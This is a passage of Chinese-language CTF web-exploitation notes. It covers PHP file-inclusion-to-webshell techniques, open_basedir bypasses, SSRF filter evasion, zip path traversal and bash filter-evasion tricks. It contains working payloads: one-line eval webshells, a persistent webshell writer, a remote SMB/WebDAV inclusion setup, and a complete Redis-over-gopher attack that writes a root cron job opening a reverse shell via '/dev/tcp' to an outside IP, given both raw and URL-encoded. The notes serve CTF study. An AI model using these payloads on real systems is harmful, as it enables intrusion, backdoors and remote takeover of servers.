2、因为phpinfo特免会将所有的数据都打印出来，垃圾数据会加大phpinfo的加载时间
3、直接操作原生socket，每次读取4096个字节，只要读取到的字符里面包含临时文件名，就立即发送第二个数据包
4、此时，第一个数据包的socket连接实际上还没有结束，因为php还在继续每次输出4096个字节，所以临时文件此时还没有删除
5、利用这个时间差在第二个数据包进行文件包含漏洞的利用，即可成功包含临时文件，最终getshell
6、同时，对于webshell也有讲究，因为包含过程比较麻烦，如果使用一次性一句话木马
<?php @eval($_REQUEST['SSS']);
则每次执行命令都需要进行一次包含，耗时耗力，所以我们璇姐保函后写入文件的shell
<?php file_put_contents('/tmp/sky', '<?php @eval($_REQUEST[sky]);?>');?>
这样一旦包含成功，该shell就会在tmp目录下永久留下一句木马，之后直接利用即可
具体py脚本，见   phpinfo_lfi_getshell.py





#文件包含 lfi   LFI+php7崩溃        php7.0/7.1
上一个利用点需要phpinfo()存在，如果目标不存在phpinfo，可以利用php7断错误的特性
当某文件存在文件包含漏洞，利用如下方式，会是php执行过程出现断错误
http://ip/index.php?file=php://filter/string.strip_tags=/etc/passwd
如果咋此时同时上传文件，那么文件会被保存在/tmp目录，不会被删除
但是要利用这个特性就需要知道文件再/tmp目录中的文件名字（该文件名字以php三个字母开头），需要结合其他漏洞，
比如题目存在  var_dump(scandir('/tmp'));等用于列目录的函数
具体利用脚本见     LFI_PHP7崩溃.py


#文件包含 lfi   包含data://或php://input等伪协议（需要allow_url_include=On)
如代码为：
<?php  include $_GET['file']; ?>
利用方式为：
1、
   GET /index.php?file=php://input HTTP/1.1
   <?php  phpinfo(); ?
2、
   GET /index.php?file=data://text/plain;base64,PD9waHAgcGhwaW5mbygpOyA/Pg==
以上两种方式可以直接执行命令

#lfi  包含环境变量文件/proc/self/environ来GetShell 
需要PHP运行在CGI模式、然后和包含日志一样，在User-agent修改成payload。
这个是利用Linux中的环境变量作为基础，很多时候这个方法行不通，因为没有/proc/self/environ的访问权限
如果有访问权限，这个文件会有用户访问web的session信息，其中也会包含user-agent的参数
一女子在user-agent中发送恶意代码，之后再包含/proc/self/environ这个文件就可以



#文件上传的题目，题目只允许上传的文件内容包含固定几个字母，比如只允许含有 aedsf
解决办法为利用这固定的几个字符，扩充到用来表示base64的64个字符
base64解码函数存在一个小trick，解码函数为了提高自己的容错性，如果参数中有非法字符（即不在base64的64个字符范围之内的）就会跳过
那么就可以利用题目允许的这几个字符通过排列再解码就会出现新的字符，这些字符中的非法字符又被跳过，最终成功扩展整个字符集，
利用脚本为 upload_LFI_exp.py


#任意文件包含漏洞，如果session.upload_progress.enabled=On开启，就可以包含session来getshell。
当session.upload_progress.enabled=On时，php能够在每一个文件进行上传时检测上传进度（缓存），这个信息对上传请求自身并没有什么帮助，但在文件上传时应用可以发送一个post请求来检查这个状态，
那么如何检查那，需要当一个上传在处理时，同时post设置与INI中设置的session.upload_progress.name同名变量时，上传进度
可以在$_SESSION中获得。当php检测到这种post请求时，它会在$_SESSION中添加一组数据，这组数据会被保存在文件 "/var/lib/php/sessions/sess_"+PHPSESSID 中，这组数据内容是session.upload_progress.prefix与session.upload_progress.name连接在一起的值
其中session.upload_progress.prefix的值默认是upload_progress_，session.upload_progress.name是我们的可控值，也就是写入shell的地方
但是如果session.upload_progress.cleanup=On开启，那么POST一被读取，session的内容就会被清空，所以为了在清空之前能包含到有我们payload的session，还需要用条件竞争。
利用脚本在 session_lfi.py中

#上面这个问题的进阶版hitcon2018 one-line-php-challenge
题目代码为：
($_=@$_GET['orange']) && @substr(file($_)[0],0,6) === '@<?php' ? include($_) : highlight_file(__FILE__);
这个题目本身并没有开启session，但事实上无论session是否开启，只要发的POST请求中只要包含ini_get("session.upload_progress.name")这个键值，并带上session_id，同时进行文件上传，就会直接创建一个session文件。
题目进阶的地方在于上传文件后在进行包含时会检测内容是否是指定字符开头，
但是上面提过，在/var/lib/php/sessions/sess_"+PHPSESSID " 文件中存储的数据是session.upload_progress.prefix与session.upload_progress.name连接在一起的值
其中session.upload_progress.prefix的值默认是upload_progress_，也就是以upload_progress_开头，在前面遇到过利用base64解码会自动过滤掉非法字符的特性将指定的某几个字符扩充至整个字符集，而这里就是利用多次base64解码来去除upload_progress_，由于base64解码的以4个字符为一组，为了避免在解码去除upload_progress_过程中吞掉我的shell，所以最后控制SESSION的key值为：
"upload_progress_ZZ".base64_encode(base64_encode(base64_encode('@<?php eval($_GET[1]);')));
其中ZZ两个字母不能随意换成AA之类的，需要特定。
这样上传之后，在进行包含getshell时，利用php://filter协议，利用方式为
url=xxx.php?orange=php://filter/convert.base64-decode|convert.base64-decode|convert.base64-decode/resource=/var/lib/php/sessions/sess_ +PHPSESSID 
利用脚本在session_lif_base64.py中



//绕过 open_basedir
首先，正常情况下设置
ini_set('open_bansedir','tmp');
之后，如果想再次进行 ini_set() 只能在设置为第一次设置的目录的下级目录，比如
ini_set('open_bansedir','tmp/aaa');
而不能设置上级目录
ini_set('open_bansedir','/');
如果设置了上级目录运行的话会有警告，尝试列上级目录的文件时也会失败
绕过方式：
ini_set('open_bansedir','tmp');
mkdir('sub');
chdir('sub');
ini_set('open_bansedir','..');
chdir('..');
ini_set('open_bansedir','..');
chdir('..');
这样可以不断的将目录进行上跳，这时再执行
ini_set('open_bansedir','/'); 是可以成功的
注意在第一次设置ini_set('open_bansedir','..')之前必须先创建一个文件夹并且chdir进入里面之后后面的才可以成功。


//绕过 open_basedir 的其他方式    open_basedir在phpinfo中也可以看到
在0ctf中，bypass  open_basedir  是通过putenv  预加载.so .dll等库时hook system函数的底层的C代码实现，以此绕过php的限制，然后进行rce
在*ctf中，disable all function ，题目中开了fpm，利用socker打fpm，这里是利用了一个php未修的bug
在Rctf中，同样也是disable all function ，无fpm，利用了php7.4的新特性FFI，FFI，即外部函数接口，是一个让我们在php里调用c代码的技术，利用这个新特性，调用system的c代码





在*ctf中，题目能getshell，在其根目录下有一个readflag的可执行文件，该文件运行后会输出一个算式，并要求输入这个算式的结果，结果正确的话就会输出flag，所以问题就是实现这个交互过程，其实就是涉及到进程问题
可以使用PHP的proc_open来执行/readflag，并算出随机算式的答案重定向到程序中获取flag

<?php  
$descriptorspec = array(
  0 => array("pipe","r"),
1=> array("pipe","w"),
2=> array("file","/tmp/error.log","a")
 );
$cwd="/";
$env=array();
$process=proc_open('/readflag', $descriptorspec, $pipes,$cwd,$env);
if(is_resource($process)){
  $descriptorspec=fread($pipes[1],1024);
  $descriptorspec=fread($pipes[1], 1024);
  $descriptorspec=explode("\n", $descriptorspec);
  eval("\$result=$descriptorspec[0];");
  echo "\$result=$descriptorspec[0];";
  fwrite($pipes[0], "$result\n");
  var_dump(fread($pipes[1],1024));
  var_dump(fread($pipes[1],1024));
  var_dump(fread($pipes[1],1024));
  fclose($pipes[0]);
  fclose($pipes[1]);
  $result_value=proc_close($process);
  echo "result $result_value\n";
}



SSRF 禁用 127.0.0.1 后如何绕过，支持哪些协议？

(1)利用进制转换
(2)利用DNS解析
(3)利用句号（127。0。0。1）
(4)利用[::]（http://[::]:80/）；
(5)利用@（http://example.com@127.0.0.1）；
(6)利用短地址（http://dwz.cn/11SMa）；
(7)协议（Dict://、SFTP://、TFTP://、LDAP://、Gopher://）




#在ssrf等题型中常见，题目会要求访问一个指定的url，但是我需要访问的是另外一个url
#利用下面解析顺序的差异绕过
#parse_url和libcurl解析url的区别
/*
php parse_url：
host: 匹配最后一个@后面符合格式的host
libcurl：
host：匹配第一个@后面符合格式的host
比如如下url：http://u:p@a.com:80@b.com/

php解析结果：
schema: http 
host: b.com
user: u
pass: p@a.com:80

而libcurl解析结果：
schema: http
host: a.com
user: u
pass: p
port: 80
后面的@b.com/会被忽略掉
*/
parse_url(url)还有的另外一个问题就是当url为 http://1.1.1.1///index.php,利用三个/导致解析异常



#file协议问题
当存在ssrf漏洞或者网站存在诸如
http://xxx/proxy.php?url=http://dn.jarvisoj.com/static/images/proxy.jpg   
这样的链接
尝试使用file协议看能否读取文件
http://xxx/proxy.php?url=file:///etc/passwd
其中若存在file关键字简单过滤，可以尝试使用大小写绕过，
之后遇到的问题是不知道网站路径，可以考虑这里传的参数是url，尝试传递空值或者数组，如
http://xxx/proxy.php?url=
http://xxx/proxy.php?url[]=file:///etc/passwd 如果报错会提示路径信息，找到路径后尝试网站目录爆破，包括常规php文件、robots.txt、.git等







Redis问题：
Redis是一个开源的使用ANSI C语言编写、支持网络、可基于内存亦可持久化的日志型、Key-Value数据库，并提供多种语言的API。
redis本身一般是没有问题的，也没有cve什么的，其存在的问题要么是未授权登录，因为默认密码为空，即没有设置密码
要么就是授权的，即弱密码登录。
redis服务默认端口开在6379
redis导致的问题比较常见的是任意文件写入，一般内网中会存在以root权限运行的redis服务，利用gopher协议攻击内网中的redis。

通常攻击redis的命令是：（效果是写计划任务反弹shell，所以自己这端提前开端口监听 nc -lvvp 23333 ）
redis-cli -h $1 flushall
echo -e "\n\n*/1 * * * * bash -i >& /dev/tcp/172.19.23.228/2333 0>&1\n\n"|redis-cli -h $1 -x set 1
redis-cli -h $1 config set dir /var/spool/cron/
redis-cli -h $1 config set dbfilename root
redis-cli -h $1 save

抓包获取这段攻击redis的命令的数据流为：
_*1
$8
flushall
*3
$3
set
$1
1
$64



*/1 * * * * bash -i >& /dev/tcp/172.19.23.228/2333 0>&1







*4
$6
config
$3
set
$3
dir
$16
/var/spool/cron/
*4
$6
config
$3
set
$10
dbfilename
$4
root
*1
$4
save
quit


使用gopher伪造的是这段数据流，
将这个命令改成适配于gopher协议的url：
gopher://127.0.0.1:6379/_*1%0d%0a$8%0d%0aflushall%0d%0a*3%0d%0a$3%0d%0aset%0d%0a$1%0d%0a1%0d%0a$64%0d%0a%0d%0a%0a%0a*/1 * * * * bash -i >& /dev/tcp/172.19.23.228/2333 0>&1%0a%0a%0a%0a%0a%0d%0a%0d%0a%0d%0a*4%0d%0a$6%0d%0aconfig%0d%0a$3%0d%0aset%0d%0a$3%0d%0adir%0d%0a$16%0d%0a/var/spool/cron/%0d%0a*4%0d%0a$6%0d%0aconfig%0d%0a$3%0d%0aset%0d%0a$10%0d%0adbfilename%0d%0a$4%0d%0aroot%0d%0a*1%0d%0a$4%0d%0asave%0d%0aquit%0d%0a

/*
实际上上面这段内容就是以%0d%0a填充数据流的换行，类似于http header头的\r\n,$6这种指的是后面变量的长度，*4这种指的是后面变量的数量
比如说我要构造数据使用gopher认证登录redis，想要构造的数据流如下：
_*2
$4
AUTH
$6
123456                 (密码)
那么改成适配成gopher的就是：
_*2%0d%0a$4%0d%0aAUTH%0d%0a$6%0d%0a123456
*/


最后利用的时候这段内容要再进行一次url编码,因为这是ssrf，第一次请求的时候会解一次码，伪造服务端访问内网ip的时候会再解一次码：
http://112.113.113.1/1.php?url=gopher%3A%2F%2F127.0.0.1%3A6379%2F_%2A1%250d%250a%248%250d%250aflushall%250d%250a%2A3%250d%250a%243%250d%250aset%250d%250a%241%250d%250a1%250d%250a%2464%250d%250a%250d%250a%250a%250a%2A%2F1+%2A+%2A+%2A+%2A+bash+-i+%3E%26+%2Fdev%2Ftcp%2F172.19.23.228%2F2333+0%3E%261%250a%250a%250a%250a%250a%250d%250a%250d%250a%250d%250a%2A4%250d%250a%246%250d%250aconfig%250d%250a%243%250d%250aset%250d%250a%243%250d%250adir%250d%250a%2416%250d%250a%2Fvar%2Fspool%2Fcron%2F%250d%250a%2A4%250d%250a%246%250d%250aconfig%250d%250a%243%250d%250aset%250d%250a%2410%250d%250adbfilename%250d%250a%244%250d%250aroot%250d%250a%2A1%250d%250a%244%250d%250asave%250d%250aquit%250d%250



以上利用为使用gopher攻击redis，前提是php开启gopher wrapper，通过phpinfo可以看是否开启，大部分php是不开的
Gopher 协议是 HTTP 协议出现之前，在 Internet 上常见且常用的一个协议。当然现在 Gopher 协议已经慢慢淡出历史。
Gopher 协议可以做很多事情，特别是在 SSRF 中可以发挥很多重要的作用。利用此协议可以攻击内网的 FTP、Telnet、Redis、Memcache，也可以进行 GET、POST 请求
 下面这篇长亭的文章中介绍了gopher相关的攻击面。
 https://blog.chaitin.cn/gopher-attack-surfaces/


 当题目可以上传压缩包的时候，而题目会对他自动解压，可以尝试进行目录穿越，方式是编辑文件名为  ../../../../evil 这种文件名，解压时会触发目录穿越,当然在创建文件的时候系统是不允许创建这种带../的名字，可以先创建正常文件结构，比如aaaaaa/evil 这样，然后使用winhex这类文件打开压缩包将aaaaaa修改为../../ 这里需要注意修改前后的字符数量需要一致，否则压缩包出现问题，这里aaaaaa和../../都是6个字符，也可以不适用winhex这种，直接在post数据的时候抓包修改。



allow_url_include = Off时的文件包含漏洞的绕过方法
1、利用smb协议
前提：    目标为windows服务器
Payload： http://127.0.0.1/aaa.php?id=\\43.5*.**.74\ica\abc1238.htm
利用方式：在自己的远程服务器上搭建samba服务，然后添加一个无需认证即可访问的共享目录，配置信息如下：
[ica]
path=/home/share
wirtable=no
guest ok = yes 
guest only = yes
read only = yes
directory mode = 0555
force uesr = nobody
然后在/home/share目录创建abc1238.htm文件，启动Samba服务，访问http://127.0.0.1/aaa.php?id=\\43.5*.**.74\ica\abc1238.htm
2、利用WebDav
前提：    目标为windows服务器
Payload： http://127.0.0.1/aaa.php?id=\\36.*8.**.74\webdav\code.htm&cmd=phpinfo();
利用方式：首先在VPS上搭建WebDAV环境，我是基于Ubuntu+Apache httpd搭建的WebDAV环境。
然后在WebDAV目录下创建code.htm文件，文件内容为：<?php eval($_GET['cmd']);?>
最后启动Apache httpd服务器，访问http://127.0.0.1/aaa.php?path=\\36.*8.**.74\webdav\code.htm&cmd=phpinfo();即可绕过allow_url_include = Off的限制GetShell。




#在bash命令行中的一些绕过技巧   更多更全在这里：https://xz.aliyun.com/t/3918
#绕过空格过滤，即在bash中可以当做空格用的：
$IFS$9
${IFS}
%09  #需要php环境
<>   #例如 cat<>flag.txt
<    #例如 cat<flag.txt
#绕过大于号>符号的过滤
$PS2    #bash中即为>
#绕过+加号符号的过滤
$PS4   #bash中即为+
#命令分隔符
%0a符号 换行符 
%0d符号 回车符 
;符号 在 shell 中，担任”连续指令”功能的符号就是”分号” 
&符号 & 放在启动参数后面表示设置此进程为后台进程，默认情况下，进程是前台进程，这时就把Shell给占据了，我们无法进行其他操作，对于那些没有交互的进程，很多时候，我们希望将其在后台启动，可以在启动参数的时候加一个’&’实现这个目的。进程切换到后台的时候，我们把它称为job。 
|符号 管道符左边命令的输出就会作为管道符右边命令的输入
#黑名单绕过
a=l;b=s;$a$b
base64编码   echo “dw5hbWU=”|base64 -d
#其他
l\s  可以当做ls用      ca\t ./fla\g   等价于cat ./flag
${9}为空，使用和上面的\一样

/*



